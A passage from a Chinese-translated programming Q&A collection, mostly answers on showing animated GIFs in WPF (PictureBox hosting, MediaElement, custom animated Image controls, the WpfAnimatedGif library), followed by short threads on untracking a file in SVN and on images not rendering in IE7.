    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    xmlns:wfi="clr-namespace:System.Windows.Forms.Integration;assembly=WindowsFormsIntegration"
    xmlns:winForms="clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms"
    Loaded="Window_Loaded" >
    <Grid>
        <wfi:WindowsFormsHost>
            <winForms:PictureBox x:Name="pictureBoxLoading">
            </winForms:PictureBox>
        </wfi:WindowsFormsHost>
    </Grid>
</Window > 
```

然后在`Window_Loaded`处理程序中，将`pictureBoxLoading.ImageLocation`属性设置为要显示的图像文件路径。

```
private void Window_Loaded(object sender, RoutedEventArgs e)
{
    pictureBoxLoading.ImageLocation = "../Images/mygif.gif";
} 
```

那个`MediaElement`线程中提到了控件，但是也提到它是一个比较重的控件，所以有很多替代方案，包括至少2个基于控件的自制控件`Image`，所以这是最简单的。

* * *

## 回答 #5

> 赞同：17
> 
>             
> 
> 时间：2014-04-23T13:17:15.363

如果您使用它非常简单`<MediaElement>`：

```
<MediaElement  Height="113" HorizontalAlignment="Left" Margin="12,12,0,0" 
Name="mediaElement1" VerticalAlignment="Top" Width="198" Source="C:\Users\abc.gif"
LoadedBehavior="Play" Stretch="Fill" SpeedRatio="1" IsMuted="False" /> 
```

* * *

## 回答 #6

> 赞同：11
> 
>             
> 
> 时间：2009-11-02T09:26:59.067

这是我的动画图像控制版本。您可以使用标准属性 Source 来指定图像源。我进一步改进了它。我是俄罗斯人，项目是俄语，所以评论也是俄语。但是无论如何，您应该能够在没有评论的情况下理解所有内容。:)

```
/// <summary>
/// Control the "Images", which supports animated GIF.
/// </summary>
public class AnimatedImage : Image
{
    #region Public properties

    /// <summary>
    /// Gets / sets the number of the current frame.
    /// </summary>
    public int FrameIndex
    {
        get { return (int) GetValue(FrameIndexProperty); }
        set { SetValue(FrameIndexProperty, value); }
    }

    /// <summary>
    /// Gets / sets the image that will be drawn.
    /// </summary>
    public new ImageSource Source
    {
        get { return (ImageSource) GetValue(SourceProperty); }
        set { SetValue(SourceProperty, value); }
    }

    #endregion

    #region Protected interface

    /// <summary>
    /// Provides derived classes an opportunity to handle changes to the Source property.
    /// </summary>
    protected virtual void OnSourceChanged(DependencyPropertyChangedEventArgs aEventArgs)
    {
        ClearAnimation();

        BitmapImage lBitmapImage = aEventArgs.NewValue as BitmapImage;

        if (lBitmapImage == null)
        {
            ImageSource lImageSource = aEventArgs.NewValue as ImageSource;
            base.Source = lImageSource;
            return;
        }

        if (!IsAnimatedGifImage(lBitmapImage))
        {
            base.Source = lBitmapImage;
            return;
        }

        PrepareAnimation(lBitmapImage);
    }

    #endregion

    #region Private properties

    private Int32Animation Animation { get; set; }
    private GifBitmapDecoder Decoder { get; set; }
    private bool IsAnimationWorking { get; set; }

    #endregion

    #region Private methods

    private void ClearAnimation()
    {
        if (Animation != null)
        {
            BeginAnimation(FrameIndexProperty, null);
        }

        IsAnimationWorking = false;
        Animation = null;
        Decoder = null;
    }

    private void PrepareAnimation(BitmapImage aBitmapImage)
    {
        Debug.Assert(aBitmapImage != null);

        if (aBitmapImage.UriSource != null)
        {
            Decoder = new GifBitmapDecoder(
                aBitmapImage.UriSource,
                BitmapCreateOptions.PreservePixelFormat,
                BitmapCacheOption.Default);
        }
        else
        {
            aBitmapImage.StreamSource.Position = 0;
            Decoder = new GifBitmapDecoder(
                aBitmapImage.StreamSource,
                BitmapCreateOptions.PreservePixelFormat,
                BitmapCacheOption.Default);
        }

        Animation =
            new Int32Animation(
                0,
                Decoder.Frames.Count - 1,
                new Duration(
                    new TimeSpan(
                        0,
                        0,
                        0,
                        Decoder.Frames.Count / 10,
                        (int) ((Decoder.Frames.Count / 10.0 - Decoder.Frames.Count / 10) * 1000))))
                {
                    RepeatBehavior = RepeatBehavior.Forever
                };

        base.Source = Decoder.Frames[0];
        BeginAnimation(FrameIndexProperty, Animation);
        IsAnimationWorking = true;
    }

    private bool IsAnimatedGifImage(BitmapImage aBitmapImage)
    {
        Debug.Assert(aBitmapImage != null);

        bool lResult = false;
        if (aBitmapImage.UriSource != null)
        {
            BitmapDecoder lBitmapDecoder = BitmapDecoder.Create(
                aBitmapImage.UriSource,
                BitmapCreateOptions.PreservePixelFormat,
                BitmapCacheOption.Default);
            lResult = lBitmapDecoder is GifBitmapDecoder;
        }
        else if (aBitmapImage.StreamSource != null)
        {
            try
            {
                long lStreamPosition = aBitmapImage.StreamSource.Position;
                aBitmapImage.StreamSource.Position = 0;
                GifBitmapDecoder lBitmapDecoder =
                    new GifBitmapDecoder(
                        aBitmapImage.StreamSource,
                        BitmapCreateOptions.PreservePixelFormat,
                        BitmapCacheOption.Default);
                lResult = lBitmapDecoder.Frames.Count > 1;

                aBitmapImage.StreamSource.Position = lStreamPosition;
            }
            catch
            {
                lResult = false;
            }
        }

        return lResult;
    }

    private static void ChangingFrameIndex
        (DependencyObject aObject, DependencyPropertyChangedEventArgs aEventArgs)
    {
        AnimatedImage lAnimatedImage = aObject as AnimatedImage;

        if (lAnimatedImage == null || !lAnimatedImage.IsAnimationWorking)
        {
            return;
        }

        int lFrameIndex = (int) aEventArgs.NewValue;
        ((Image) lAnimatedImage).Source = lAnimatedImage.Decoder.Frames[lFrameIndex];
        lAnimatedImage.InvalidateVisual();
    }

    /// <summary>
    /// Handles changes to the Source property.
    /// </summary>
    private static void OnSourceChanged
        (DependencyObject aObject, DependencyPropertyChangedEventArgs aEventArgs)
    {
        ((AnimatedImage) aObject).OnSourceChanged(aEventArgs);
    }

    #endregion

    #region Dependency Properties

    /// <summary>
    /// FrameIndex Dependency Property
    /// </summary>
    public static readonly DependencyProperty FrameIndexProperty =
        DependencyProperty.Register(
            "FrameIndex",
            typeof (int),
            typeof (AnimatedImage),
            new UIPropertyMetadata(0, ChangingFrameIndex));

    /// <summary>
    /// Source Dependency Property
    /// </summary>
    public new static readonly DependencyProperty SourceProperty =
        DependencyProperty.Register(
            "Source",
            typeof (ImageSource),
            typeof (AnimatedImage),
            new FrameworkPropertyMetadata(
                null,
                FrameworkPropertyMetadataOptions.AffectsRender |
                FrameworkPropertyMetadataOptions.AffectsMeasure,
                OnSourceChanged));

    #endregion
} 
```

* * *

## 回答 #7

> 赞同：10
> 
>             
> 
> 时间：2014-06-23T14:37:08.293

我使用这个库：[https ://github.com/XamlAnimatedGif/WpfAnimatedGif](https://github.com/XamlAnimatedGif/WpfAnimatedGif)

首先，将库安装到您的项目中（使用包管理器控制台）：

```
 PM > Install-Package WpfAnimatedGif 
```

然后，将此代码段用于 XAML 文件：

```
 <Window x:Class="WpfAnimatedGif.Demo.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:gif="http://wpfanimatedgif.codeplex.com"
        Title="MainWindow" Height="350" Width="525">
        <Grid>
            <Image gif:ImageBehavior.AnimatedSource="Images/animated.gif" />
        ... 
```

我希望有所帮助。

来源：[https ://github.com/XamlAnimatedGif/WpfAnimatedGif](https://github.com/XamlAnimatedGif/WpfAnimatedGif)

* * *

## 回答 #8

> 赞同：6
> 
>             
> 
> 时间：2010-04-10T16:16:15.383

我修改了 Mike Eshva 的代码，让它工作得更好。你可以将它与 1frame jpg png bmp 或 mutil-frame gif 一起使用。如果你想将 uri 绑定到控件，绑定 UriSource 属性或者你想绑定任何 in-绑定源属性的内存流，它是一个 BitmapImage。

```
 /// <summary> 
/// Элемент управления "Изображения", поддерживающий анимированные GIF. 
/// </summary> 
public class AnimatedImage : Image
{
    static AnimatedImage()
    {
        DefaultStyleKeyProperty.OverrideMetadata(typeof(AnimatedImage), new FrameworkPropertyMetadata(typeof(AnimatedImage)));
    }

    #region Public properties

    /// <summary> 
    /// Получает/устанавливает номер текущего кадра. 
    /// </summary> 
    public int FrameIndex
    {
        get { return (int)GetValue(FrameIndexProperty); }
        set { SetValue(FrameIndexProperty, value); }
    }

    /// <summary>
    /// Get the BitmapFrame List.
    /// </summary>
    public List<BitmapFrame> Frames { get; private set; }

    /// <summary>
    /// Get or set the repeatBehavior of the animation when source is gif formart.This is a dependency object.
    /// </summary>
    public RepeatBehavior AnimationRepeatBehavior
    {
        get { return (RepeatBehavior)GetValue(AnimationRepeatBehaviorProperty); }
        set { SetValue(AnimationRepeatBehaviorProperty, value); }
    }

    public new BitmapImage Source
    {
        get { return (BitmapImage)GetValue(SourceProperty); }
        set { SetValue(SourceProperty, value); }
    }

    public Uri UriSource
    {
        get { return (Uri)GetValue(UriSourceProperty); }
        set { SetValue(UriSourceProperty, value); }
    }

    #endregion

    #region Protected interface

    /// <summary> 
    /// Provides derived classes an opportunity to handle changes to the Source property. 
    /// </summary> 
    protected virtual void OnSourceChanged(DependencyPropertyChangedEventArgs e)
    {
        ClearAnimation();
        BitmapImage source;
        if (e.NewValue is Uri)
        {
            source = new BitmapImage();
            source.BeginInit();
            source.UriSource = e.NewValue as Uri;
            source.CacheOption = BitmapCacheOption.OnLoad;
            source.EndInit();
        }
        else if (e.NewValue is BitmapImage)
        {
            source = e.NewValue as BitmapImage;
        }
        else
        {
            return;
        }
        BitmapDecoder decoder;
        if (source.StreamSource != null)
        {
            decoder = BitmapDecoder.Create(source.StreamSource, BitmapCreateOptions.DelayCreation, BitmapCacheOption.OnLoad);
        }
        else if (source.UriSource != null)
        {
            decoder = BitmapDecoder.Create(source.UriSource, BitmapCreateOptions.DelayCreation, BitmapCacheOption.OnLoad);
        }
        else
        {
            return;
        }
        if (decoder.Frames.Count == 1)
        {
            base.Source = decoder.Frames[0];
            return;
        }

        this.Frames = decoder.Frames.ToList();

        PrepareAnimation();
    }

    #endregion

    #region Private properties

    private Int32Animation Animation { get; set; }
    private bool IsAnimationWorking { get; set; }

    #endregion

    #region Private methods

    private void ClearAnimation()
    {
        if (Animation != null)
        {
            BeginAnimation(FrameIndexProperty, null);
        }

        IsAnimationWorking = false;
        Animation = null;
        this.Frames = null;
    }

    private void PrepareAnimation()
    {
        Animation =
            new Int32Animation(
                0,
                this.Frames.Count - 1,
                new Duration(
                    new TimeSpan(
                        0,
                        0,
                        0,
                        this.Frames.Count / 10,
                        (int)((this.Frames.Count / 10.0 - this.Frames.Count / 10) * 1000))))
            {
                RepeatBehavior = RepeatBehavior.Forever
            };

        base.Source = this.Frames[0];
        BeginAnimation(FrameIndexProperty, Animation);
        IsAnimationWorking = true;
    }

    private static void ChangingFrameIndex
        (DependencyObject dp, DependencyPropertyChangedEventArgs e)
    {
        AnimatedImage animatedImage = dp as AnimatedImage;

        if (animatedImage == null || !animatedImage.IsAnimationWorking)
        {
            return;
        }

        int frameIndex = (int)e.NewValue;
        ((Image)animatedImage).Source = animatedImage.Frames[frameIndex];
        animatedImage.InvalidateVisual();
    }

    /// <summary> 
    /// Handles changes to the Source property. 
    /// </summary> 
    private static void OnSourceChanged
        (DependencyObject dp, DependencyPropertyChangedEventArgs e)
    {
        ((AnimatedImage)dp).OnSourceChanged(e);
    }

    #endregion

    #region Dependency Properties

    /// <summary> 
    /// FrameIndex Dependency Property 
    /// </summary> 
    public static readonly DependencyProperty FrameIndexProperty =
        DependencyProperty.Register(
            "FrameIndex",
            typeof(int),
            typeof(AnimatedImage),
            new UIPropertyMetadata(0, ChangingFrameIndex));

    /// <summary> 
    /// Source Dependency Property 
    /// </summary> 
    public new static readonly DependencyProperty SourceProperty =
        DependencyProperty.Register(
            "Source",
            typeof(BitmapImage),
            typeof(AnimatedImage),
            new FrameworkPropertyMetadata(
                null,
                FrameworkPropertyMetadataOptions.AffectsRender |
                FrameworkPropertyMetadataOptions.AffectsMeasure,
                OnSourceChanged));

    /// <summary>
    /// AnimationRepeatBehavior Dependency Property
    /// </summary>
    public static readonly DependencyProperty AnimationRepeatBehaviorProperty =
        DependencyProperty.Register(
        "AnimationRepeatBehavior",
        typeof(RepeatBehavior),
        typeof(AnimatedImage),
        new PropertyMetadata(null));

    public static readonly DependencyProperty UriSourceProperty =
        DependencyProperty.Register(
        "UriSource",
        typeof(Uri),
        typeof(AnimatedImage),
                new FrameworkPropertyMetadata(
                null,
                FrameworkPropertyMetadataOptions.AffectsRender |
                FrameworkPropertyMetadataOptions.AffectsMeasure,
                OnSourceChanged));

    #endregion
} 
```

这是一个自定义控件。您需要在 WPF App Project 中创建它，并删除样式中的模板覆盖。

* * *

## 回答 #9

> 赞同：5
> 
>             
> 
> 时间：2011-07-16T01:33:57.240

基本上与上面相同的 PictureBox 解决方案，但这次使用代码隐藏在您的项目中使用嵌入式资源：

在 XAML 中：

```
<WindowsFormsHost x:Name="_loadingHost">
  <Forms:PictureBox x:Name="_loadingPictureBox"/>
</WindowsFormsHost> 
```

在代码隐藏中：

```
public partial class ProgressIcon
{
    public ProgressIcon()
    {
        InitializeComponent();
        var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("My.Namespace.ProgressIcon.gif");
        var image = System.Drawing.Image.FromStream(stream);
        Loaded += (s, e) => _loadingPictureBox.Image = image;
    }
} 
```

* * *

## 回答 #10

> 赞同：3
> 
>             
> 
> 时间：2011-06-29T18:56:03.303

感谢您的帖子 Joel，它帮助我解决了 WPF 不支持动画 GIF 的问题。只需添加一些代码，因为由于 Winforms api，我有一段时间设置 pictureBoxLoading.Image 属性。

我必须将动画 gif 图像的构建操作设置为“内容”，并将复制到输出目录设置为“如果更新则复制”或“始终”。然后在 MainWindow() 我调用了这个方法。唯一的问题是，当我尝试处理流时，它给了我一个红包图形而不是我的图像。我必须解决这个问题。这消除了加载 BitmapImage 并将其更改为 Bitmap 的痛苦（这显然杀死了我的动画，因为它不再是 gif）。

```
private void SetupProgressIcon()
{
   Uri uri = new Uri("pack://application:,,,/WPFTest;component/Images/animated_progress_apple.gif");
   if (uri != null)
   {
      Stream stream = Application.GetContentStream(uri).Stream;   
      imgProgressBox.Image = new System.Drawing.Bitmap(stream);
   }
} 
```

* * *

## 回答 #11

> 赞同：3
> 
>             
> 
> 时间：2011-04-01T22:08:52.857

我遇到了这个问题，直到我发现在 WPF4 中，您可以模拟自己的关键帧图像动画。首先，将您的动画拆分为一系列图像，将它们命名为“Image1.gif”、“Image2,gif”等。将这些图像导入您的解决方案资源。我假设您将它们放在图像的默认资源位置。

您将使用图像控件。使用以下 XAML 代码。我已经删除了非必需品。

```
<Image Name="Image1">
   <Image.Triggers>
      <EventTrigger RoutedEvent="Image.Loaded"
         <EventTrigger.Actions>
            <BeginStoryboard>
               <Storyboard>
                   <ObjectAnimationUsingKeyFrames Duration="0:0:1" Storyboard.TargetProperty="Source" RepeatBehavior="Forever">
                      <DiscreteObjectKeyFrames KeyTime="0:0:0">
                         <DiscreteObjectKeyFrame.Value>
                            <BitmapImage UriSource="Images/Image1.gif"/>
                         </DiscreteObjectKeyFrame.Value>
                      </DiscreteObjectKeyFrames>
                     <DiscreteObjectKeyFrames KeyTime="0:0:0.25">
                        <DiscreteObjectKeyFrame.Value>
                           <BitmapImage UriSource="Images/Image2.gif"/>
                        </DiscreteObjectKeyFrame.Value>
                     </DiscreteObjectKeyFrames>
                     <DiscreteObjectKeyFrames KeyTime="0:0:0.5">
                        <DiscreteObjectKeyFrame.Value>
                           <BitmapImage UriSource="Images/Image3.gif"/>
                        </DiscreteObjectKeyFrame.Value>
                     </DiscreteObjectKeyFrames>
                     <DiscreteObjectKeyFrames KeyTime="0:0:0.75">
                        <DiscreteObjectKeyFrame.Value>
                           <BitmapImage UriSource="Images/Image4.gif"/>
                        </DiscreteObjectKeyFrame.Value>
                     </DiscreteObjectKeyFrames>
                     <DiscreteObjectKeyFrames KeyTime="0:0:1">
                        <DiscreteObjectKeyFrame.Value>
                           <BitmapImage UriSource="Images/Image5.gif"/>
                        </DiscreteObjectKeyFrame.Value>
                     </DiscreteObjectKeyFrames>
                  </ObjectAnimationUsingKeyFrames>
               </Storyboard>
            </BeginStoryboard>
         </EventTrigger.Actions>
      </EventTrigger>
   </Image.Triggers>
</Image> 
```

* * *

## 回答 #12

> 赞同：1
> 
>             
> 
> 时间：2013-11-27T09:08:12.900

我已经尝试了上面的所有方法，但每个都有自己的缺点，感谢大家，我制定了自己的 GifImage：

```
 using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.Text;
    using System.Windows.Controls;
    using System.Windows;
    using System.Windows.Media.Imaging;
    using System.IO;
    using System.Windows.Threading;

    namespace IEXM.Components
    {
    public class GifImage : Image
    {
            #region gif Source, such as "/IEXM;component/Images/Expression/f020.gif"
            public string GifSource
            {
                    get { return (string)GetValue(GifSourceProperty); }
                    set { SetValue(GifSourceProperty, value); }
            }

            public static readonly DependencyProperty GifSourceProperty =
                    DependencyProperty.Register("GifSource", typeof(string),
                    typeof(GifImage), new UIPropertyMetadata(null, GifSourcePropertyChanged));

            private static void GifSourcePropertyChanged(DependencyObject sender,
                    DependencyPropertyChangedEventArgs e)
            {
                    (sender as GifImage).Initialize();
            }
            #endregion

            #region control the animate
            /// <summary>
            /// Defines whether the animation starts on it's own
            /// </summary>
            public bool IsAutoStart
            {
                    get { return (bool)GetValue(AutoStartProperty); }
                    set { SetValue(AutoStartProperty, value); }
            }

            public static readonly DependencyProperty AutoStartProperty =
                    DependencyProperty.Register("IsAutoStart", typeof(bool),
                    typeof(GifImage), new UIPropertyMetadata(false, AutoStartPropertyChanged));

            private static void AutoStartPropertyChanged(DependencyObject sender,
                    DependencyPropertyChangedEventArgs e)
            {
                    if ((bool)e.NewValue)
                            (sender as GifImage).StartAnimation();
                    else
                            (sender as GifImage).StopAnimation();
            }
            #endregion

            private bool _isInitialized = false;
            private System.Drawing.Bitmap _bitmap;
            private BitmapSource _source;

            [System.Runtime.InteropServices.DllImport("gdi32.dll")]
            public static extern bool DeleteObject(IntPtr hObject);

            private BitmapSource GetSource()
            {
                    if (_bitmap == null)
                    {
                            _bitmap = new System.Drawing.Bitmap(Application.GetResourceStream(
                                     new Uri(GifSource, UriKind.RelativeOrAbsolute)).Stream);
                    }

                    IntPtr handle = IntPtr.Zero;
                    handle = _bitmap.GetHbitmap();

                    BitmapSource bs = System.Windows.Interop.Imaging.CreateBitmapSourceFromHBitmap(
                            handle, IntPtr.Zero, Int32Rect.Empty, BitmapSizeOptions.FromEmptyOptions());
                    DeleteObject(handle);
                    return bs;
            }

            private void Initialize()
            {
            //        Console.WriteLine("Init: " + GifSource);
                    if (GifSource != null)
                            Source = GetSource();
                    _isInitialized = true;
            }

            private void FrameUpdatedCallback()
            {
                    System.Drawing.ImageAnimator.UpdateFrames();

                    if (_source != null)
                    {
                            _source.Freeze();
                    }

               _source = GetSource();

              //  Console.WriteLine("Working: " + GifSource);

                    Source = _source;
                    InvalidateVisual();
            }

            private void OnFrameChanged(object sender, EventArgs e)
            {
                    Dispatcher.BeginInvoke(DispatcherPriority.Normal, new Action(FrameUpdatedCallback));
            }

            /// <summary>
            /// Starts the animation
            /// </summary>
            public void StartAnimation()
            {
                    if (!_isInitialized)
                            this.Initialize();

             //   Console.WriteLine("Start: " + GifSource);

                    System.Drawing.ImageAnimator.Animate(_bitmap, OnFrameChanged);
            }

            /// <summary>
            /// Stops the animation
            /// </summary>
            public void StopAnimation()
            {
                    _isInitialized = false;
                    if (_bitmap != null)
                    {
                            System.Drawing.ImageAnimator.StopAnimate(_bitmap, OnFrameChanged);
                            _bitmap.Dispose();
                            _bitmap = null;
                    }
                    _source = null;
                    Initialize();
                    GC.Collect();
                    GC.WaitForFullGCComplete();

             //   Console.WriteLine("Stop: " + GifSource);
            }

            public void Dispose()
            {
                    _isInitialized = false;
                    if (_bitmap != null)
                    {
                            System.Drawing.ImageAnimator.StopAnimate(_bitmap, OnFrameChanged);
                            _bitmap.Dispose();
                            _bitmap = null;
                    }
                    _source = null;
                    GC.Collect();
                    GC.WaitForFullGCComplete();
               // Console.WriteLine("Dispose: " + GifSource);
            }
    }
} 
```

用法：

```
<localComponents:GifImage x:Name="gifImage" IsAutoStart="True" GifSource="{Binding Path=value}" /> 
```

由于它不会导致内存泄漏，并且它会为 gif 图像自己的时间线设置动画，您可以尝试一下。

* * *

## 回答 #13

> 赞同：1
> 
>             
> 
> 时间：2020-06-12T20:09:05.830

WPF 中等待动画的替代方法是：

```
 <ProgressBar Height="20" Width="100" IsIndeterminate="True"/> 
```

它将显示一个动画进度条。

* * *

## 回答 #14

> 赞同：0
> 
>             
> 
> 时间：2014-01-03T23:48:39.343

方法的小改进，`GifImage.Initialize()`从 GIF 元数据中读取正确的帧时序。

```
 private void Initialize()
    {
        _gifDecoder = new GifBitmapDecoder(new Uri("pack://application:,,," + this.GifSource), BitmapCreateOptions.PreservePixelFormat, BitmapCacheOption.Default);

        int duration=0;
        _animation = new Int32AnimationUsingKeyFrames();
        _animation.KeyFrames.Add(new DiscreteInt32KeyFrame(0, KeyTime.FromTimeSpan(new TimeSpan(0))));
        foreach (BitmapFrame frame in _gifDecoder.Frames)
        {
            BitmapMetadata btmd = (BitmapMetadata)frame.Metadata;
            duration += (ushort)btmd.GetQuery("/grctlext/Delay");
            _animation.KeyFrames.Add(new DiscreteInt32KeyFrame(_gifDecoder.Frames.IndexOf(frame)+1, KeyTime.FromTimeSpan(new TimeSpan(duration*100000))));
        }            
         _animation.RepeatBehavior = RepeatBehavior.Forever;
        this.Source = _gifDecoder.Frames[0];            
        _isInitialized = true;
    } 
```

* * *

## 回答 #15

> 赞同：0
> 
>             
> 
> 时间：2013-10-23T12:34:36.987

以前，我遇到过类似的问题，我需要`.gif`在你的项目中播放文件。我有两个选择：

*   使用 WinForms 中的 PictureBox

*   使用第三方库，例如[codeplex.com 的 WPFAnimatedGif。](http://wpfanimatedgif.codeplex.com/)

版本`PictureBox`对我不起作用，该项目无法使用外部库。所以我在`Bitmap`帮助下自己完成了`ImageAnimator`。因为，标准`BitmapImage`不支持`.gif`文件播放。

完整示例：

**`XAML`**

```
<Window x:Class="PlayGifHelp.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="MainWindow" Height="350" Width="525" Loaded="MainWindow_Loaded">

    <Grid>
        <Image x:Name="SampleImage" />
    </Grid>
</Window> 
```

**`Code behind`**

```
public partial class MainWindow : Window
{
    public MainWindow()
    {
        InitializeComponent();
    }

    Bitmap _bitmap;
    BitmapSource _source;

    private BitmapSource GetSource()
    {
        if (_bitmap == null)
        {
            string path = Directory.GetCurrentDirectory();

            // Check the path to the .gif file
            _bitmap = new Bitmap(path + @"\anim.gif");
        }

        IntPtr handle = IntPtr.Zero;
        handle = _bitmap.GetHbitmap();

        return Imaging.CreateBitmapSourceFromHBitmap(handle, IntPtr.Zero, Int32Rect.Empty, BitmapSizeOptions.FromEmptyOptions());
    }

    private void MainWindow_Loaded(object sender, RoutedEventArgs e)
    {
        _source = GetSource();
        SampleImage.Source = _source;
        ImageAnimator.Animate(_bitmap, OnFrameChanged);
    }

    private void FrameUpdatedCallback()
    {
        ImageAnimator.UpdateFrames();

        if (_source != null)
        {
            _source.Freeze();
        }

        _source = GetSource();

        SampleImage.Source = _source;
        InvalidateVisual();
    }

    private void OnFrameChanged(object sender, EventArgs e)
    {
        Dispatcher.BeginInvoke(DispatcherPriority.Normal, new Action(FrameUpdatedCallback));
    }
} 
```

`Bitmap`不支持*URI*指令，所以我`.gif`从当前目录加载文件。

* * *

## 回答 #16

> 赞同：0
> 
>             
> 
> 时间：2019-07-10T17:39:22.277

检查我的代码，我希望这对你有帮助:)

```
 public async Task GIF_Animation_Pro(string FileName,int speed,bool _Repeat)
                    {
    int ab=0;
                        var gif = GifBitmapDecoder.Create(new Uri(FileName), BitmapCreateOptions.PreservePixelFormat, BitmapCacheOption.Default);
                        var getFrames = gif.Frames;
                        BitmapFrame[] frames = getFrames.ToArray();
                        await Task.Run(() =>
                        {

                            while (ab < getFrames.Count())
                            {
                                Thread.Sleep(speed);
try
{
                                Dispatcher.Invoke(() =>
                                {
                                    gifImage.Source = frames[ab];
                                });
                                if (ab == getFrames.Count - 1&&_Repeat)
                                {
                                    ab = 0;

                                }
                                ab++;
            }
 catch
{
}

                            }
                        });
                    } 
```

或者

```
 public async Task GIF_Animation_Pro(Stream stream, int speed,bool _Repeat)
            {
 int ab = 0;   
                var gif = GifBitmapDecoder.Create(stream , BitmapCreateOptions.PreservePixelFormat, BitmapCacheOption.Default);
                var getFrames = gif.Frames;
                BitmapFrame[] frames = getFrames.ToArray();
                await Task.Run(() =>
                {

                    while (ab < getFrames.Count())
                    {
                        Thread.Sleep(speed);
    try
    {

                     Dispatcher.Invoke(() =>
                        {
                            gifImage.Source = frames[ab];
                        });
                        if (ab == getFrames.Count - 1&&_Repeat)
                        {
                            ab = 0;

                        }
                        ab++;
    }
     catch{} 

                    }
                });
            } 
```

* * *

## 回答 #17

> 赞同：0
> 
>             
> 
> 时间：2018-07-02T01:39:03.493

除了推荐使用**WpfAnimatedGif**的主要响应之外，如果您要**使用 Gif 交换图像，**则必须在最后添加以下行以确保动画实际执行：

```
ImageBehavior.SetRepeatBehavior(img, new RepeatBehavior(0));
ImageBehavior.SetRepeatBehavior(img, RepeatBehavior.Forever); 
```

所以你的代码看起来像：

```
var image = new BitmapImage();
image.BeginInit();
image.UriSource = new Uri(fileName);
image.EndInit();
ImageBehavior.SetAnimatedSource(img, image);
ImageBehavior.SetRepeatBehavior(img, new RepeatBehavior(0));
ImageBehavior.SetRepeatBehavior(img, RepeatBehavior.Forever); 
```

* * *

## 回答 #18

> 赞同：0
> 
>             
> 
> 时间：2021-06-18T20:37:32.333

我建议使用 WebBrowser 控件。

如果 gif 在 web 上，您可以在 XAML 中设置源：

```
<WebBrowser Source="https://media.giphy.com/media/Ent2j55lyQipa/giphy.gif" /> 
```

如果它是本地文件，您可以从代码隐藏创建源。

XAML：

```
<WebBrowser x:Name="WebBrowser" /> 
```

代码隐藏：

```
private void Window_Loaded(object sender, RoutedEventArgs e)
{
    string curDir = Directory.GetCurrentDirectory();
    this.WebBrowser.Source = new Uri(String.Format("file:///{0}/10-monkey.gif", curDir));
} 
```

* * *

## 回答 #19

> 赞同：0
> 
>             
> 
> 时间：2017-07-24T23:28:56.730

我不确定这是否已经解决，但最好的方法是使用[WpfAnimatedGid 库](https://github.com/XamlAnimatedGif/WpfAnimatedGif)。它使用起来非常简单、简单且直接。它只需要 2 行 XAML 代码和大约 5 行 C# 代码在后面的代码中。

您将在那里看到如何使用它的所有必要细节。这也是我使用的，而不是重新发明轮子

# svn - 如何在不删除 subversion 中的文件的情况下从版本控制中删除文件？

> ID：210933
> 
>         
> 
> 赞同：4
> 
>         
> 
> 时间：2008-10-17T02:33:20.713
> 
>         
> 
> 标签：svn

我不小心使用 add 命令向 SVN 添加了一个二进制文件，现在我想将其从版本控制中删除，但不删除该文件。我该怎么做呢？

* * *

## 回答 #1

> 赞同：13
> 
>             
> 
> 时间：2008-10-17T02:39:36.630

svn rm --keep-local

* * *

## 回答 #2

> 赞同：2
> 
>             
> 
> 时间：2008-10-17T02:34:15.547

如果您还没有提交，您可以使用“svn revert”撤消添加。

* * *

## 回答 #3

> 赞同：2
> 
>             
> 
> 时间：2009-12-18T19:46:13.783

正如已经提到的 svn rm --keep-local 是要走的路。

对于那些使用 TortoiseSVN 的人来说，一个方便的快捷方式是：“删除（保留本地）”可以在 TortoiseSVN 子菜单中使用，如果您在右键单击要删除的文件时按住 Shift 按钮。

* * *

## 回答 #4

> 赞同：1
> 
>             
> 
> 时间：2008-10-17T02:36:24.903

1.  将文件复制到某处。

2.  SVN 删除它。

3.  把它复制回来，这次SVN忽略它。

* * *

## 回答 #5

> 赞同：0
> 
>             
> 
> 时间：2008-10-17T02:36:24.047

我知道如何做到这一点的最简单方法是移动文件，使用 svn 删除文件，然后将文件移回。  

* * *

## 回答 #6

> 赞同：0
> 
>             
> 
> 时间：2008-11-10T06:46:08.093

你不只是想将它添加到忽略列表中，然后删除工作副本吗？[搜索“忽略”](http://svnbook.red-bean.com/en/1.1/ch07s02.html)。换句话说，它应该保持版本控制，但不应该在您的工作副本中获取任何更改。（不完全确定你为什么要这样做......也许有更好的方法来实现你想做的事情）

# image - 图像在 IE7 中不呈现（但在 IE6/Firefox 中工作正常）

> ID：210936
> 
>         
> 
> 赞同：5
> 
>         
> 
> 时间：2008-10-17T02:36:09.537
> 
>         
> 
> 标签：image, internet-explorer-7

使用 IE7 的某些图像出现问题 - 在 6 和所有版本的 Firefox 中都可以正常工作。

有没有人遇到过这个？我知道我过去曾发生过这种情况（我在谷歌上搜索了一个修复程序，但如果我能再次找到修复程序，我会感到很遗憾......注意自我，记录这样的事情以备将来使用；））

```
<div class="contextBlock">
<p class="cntImg"><a href="files/image.jsp" title="Image"><img src="files/images/image.jpg" alt="Image" width="171" height="96" border="0">Image</a></p>
<p class="cntImg"><a href="files/image2.jsp" title="image2"><img src="files/images/image2.jpg" alt="Image2" width="171" height="96" border="0">Image2 </a></p>
<p class="comment">Click to enlarge</p>
<div class="clr"></div> 
```

* * *

## 回答 #1

> 赞同：5
> 
>             
> 
> 时间：2008-10-17T07:23:14.950

[当上传到我们网站的图像是CMYK](http://en.wikipedia.org/wiki/CMYK_color_model)格式的 JPEG 之前，我遇到过这种类型的问题- Internet Explorer 会将它们显示为一个小的红色 x，但 Firefox 会显示它们正常（肯定是从版本 3 开始，不确定更早发布）。

你能发布`contextBlock`,`cntImg`和的css规则`clr`吗？我过去遇到的另一个“有趣”的 IE 事情是图像消失在文本块后面，该文本块具有 IE 不喜欢的 css 样式，所以我想知道这是否适用于您的情况。

* * *

## 回答 #2

> 赞同：4
> 
>             
> 
> 时间：2008-11-13T15:03:12.670

